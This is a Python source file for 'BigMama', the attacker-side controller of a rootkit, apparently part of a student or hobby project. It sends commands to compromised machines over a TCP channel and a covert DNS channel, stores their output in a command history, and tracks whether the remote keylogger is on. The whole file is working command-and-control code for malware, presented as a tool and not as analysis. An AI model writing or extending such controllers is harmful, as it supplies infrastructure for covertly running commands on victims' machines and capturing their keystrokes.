from typing import Optional
import config as cfg
from utils.TCP.TCPServer import TCPServer
from utils.DNS.DNSSender  import DNSSender


class BigMama:
    """
    BigMama is the main controller for the attacker side of the rootkit.
    It manages TCP connections, DNS communication, and command history.
    It also tracks authentication status and keylogger state.
    """

    def __init__(self, tcp_host: str, tcp_port: int, tcp_crypto=None):
        self._authenticated = False
        self._klg_on = False
        self._command_history = []

        self._tcp = TCPServer(host=tcp_host, port=tcp_port, crypto=tcp_crypto, owner=self)
        self._dns = DNSSender(owner=self)

    def start(self) -> None:
        self._tcp.start()
        self._dns.start()
    
    def stop(self) -> None:
        self._tcp.stop()
        self._dns.stop()

    def send(self, command: str, use_history: bool, channel: str="tcp") -> Optional[str]:
        """
        Send `command` over the specified channel: "tcp" or "dns".
        If `use_history` is True, store (command, stdout, stderr, termination_code) locally.
        Returns the raw plaintext response, or None on timeout/failure.
        """

        resp: Optional[str] = None

        # Delegate to the chosen channel
        if channel == "tcp":
            if use_history: resp = self._tcp.send_to_client_with_history(command)
            else: resp = self._tcp.send_to_client(command)

            # If the TCP thread never got a client, resp may be None or False
            if resp is None or resp is False:
                print("[TCP] No client connected or failed to send command.")
                resp = ""

        # DNS channel always uses `use_history=True`
        else:
            resp = self._dns.send(command)
            if resp is None:
                print("[DNS] Failed to send command or no response received.")
                resp = ""

        return resp.strip()
    
    def _check_rootkit_command(self, message: str) -> None:
        match message.strip():
            case "User authenticated.":
                self._authenticated = True
                print("[AUTHENTICATION] Server authenticated successfully.")
            case "User successfully disconnected.":
                self._authenticated = False
                print("[AUTHENTICATION] User disconnected.")
            case "keylogger activated":
                self._klg_on = True
                print("[KLG] Keylogger activated.")
            case "keylogger desactivated":
                self._klg_on = False
                print("[KLG] Keylogger desactivated.")   
    
    def _update_command_history(self, message: str) -> None:
        stdout, stderr, termination_code = self._extract_outputs(message)

        # A bit strange... (from tibo) ...bad shit may happen.
        # I don't want to fight for the moment.
        for entry in reversed(self._command_history):
            if not entry["stdout"] and not entry["stderr"]:
                entry["stdout"] = stdout
                entry["stderr"] = stderr
                if termination_code:
                    entry["termination_code"] = termination_code
                break
    
    def _extract_outputs(self, message: str):
        if all(k in message for k in ["stdout:\n", "stderr:\n", "Terminated with code"]):
            stdout = message.split("stdout:\n")[-1].split("stderr:\n")[0].strip()
            stderr = message.split("stderr:\n")[-1].split("Terminated with code")[0].strip()
            termination_code = ''.join(filter(str.isdigit, message.split("Terminated with code")[-1]))
        else:
            stdout, stderr, termination_code = message, "", ""
        return stdout, stderr, termination_code

    def reset_command_history(self) -> None:
        """
        Resets the command history.
        """

        self._command_history = []
    
    def get_tcp_object(self) -> TCPServer:
        """
        Returns the TCPServer instance used by BigMama.
        """

        return self._tcp
    
    def get_dns_object(self) -> DNSSender:
        """
        Returns the DNSSender instance used by BigMama.
        """

        return self._dns

    def get_command_history(self) -> list[dict]:
        """
        Returns the command history as a list of dictionaries.
        """

        return self._command_history

    def is_authenticated(self) -> bool:
        """
        Returns True if the user is authenticated, False otherwise.
        """

        return self._authenticated

    def is_klg_on(self) -> bool:
        """
        Returns True if the keylogger is activated, False otherwise.
        """
        return self._klg_on

    def is_running(self, channel='tcp') -> bool:
        """
        Returns True if the specified channel is running, False otherwise.
        """

        if (channel == 'dns'):
            return self._dns.is_running()
        return self._tcp.is_running()
